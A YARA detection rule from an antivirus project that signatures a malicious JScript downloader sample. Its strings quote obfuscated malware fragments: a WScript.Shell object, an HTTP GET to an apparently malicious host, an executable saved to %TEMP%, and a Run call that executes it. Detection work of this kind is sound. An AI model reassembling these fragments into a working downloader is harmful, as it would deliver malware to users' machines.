rule sig_20160328_e313029c02e629124404b8c5cbef43d9 {
  meta:
    description = "datamaliciousorder - file 20160328_e313029c02e629124404b8c5cbef43d9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8266cec7a420af6cd783d0ac5a0daf9bd44a6356d17aaddc2b19375fb21fe58b"

  strings:
    $s1  = "function Aahyir() {return Dqqaee[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"u1UEFkshII.exe\";};" fullword ascii
    $s2  = "Iqkcxwou[Swsdfhppt](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Prhkspqzcf](Tholuam() * 11)} while (Iqkcxwou[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dqqaee = function Dyvfnbtrz() {return WScript[Ivmixfsq](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qprdngsjlh(Ptfakrwtz, Aalbbt){return Ptfakrwtz - Aalbbt;};" fullword ascii
    $s6  = "function Msquprmsh() {return ((Fbylkjt == true) && (Fbylkjt == Pjmtot)) ? 1 : Jozlzbwvxf;};" fullword ascii
    $s7  = "function Qgsemxtnm(Hhbvd){Dqqaee[\"Run\"](Hhbvd, Jozlzbwvxf, Jozlzbwvxf);};" fullword ascii
    $s8  = "var Yqeod = false;" fullword ascii
    $s9  = "function Tiiegu(){return Ivmixfsq;};" fullword ascii
    $s10 = "Fbylkjt = true; " fullword ascii
    $s11 = " while (Kknbaqfzs){" fullword ascii
    $s12 = "function Tholuam(){return 22;};" fullword ascii
    $s13 = "Pjmtot = true; " fullword ascii
    $s14 = "var Fbylkjt = false;" fullword ascii
    $s15 = "function Mtovgko(){return Afkublxfgs;};" fullword ascii
    $s16 = "var Pjmtot = false;" fullword ascii
    $s17 = "return Qprdngsjlh(Mgkqjue, Bqogsj);" fullword ascii
    $s18 = "var Zbqapo = new this[\"Date\"]();" fullword ascii
    $s19 = "function Dvrdfqkwgb(Yavtj) {var Hewuepeckw = (1, 2, 3, 4, 5, Yavtj); return Hewuepeckw;};" fullword ascii
    $s20 = "function Jqofryd()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}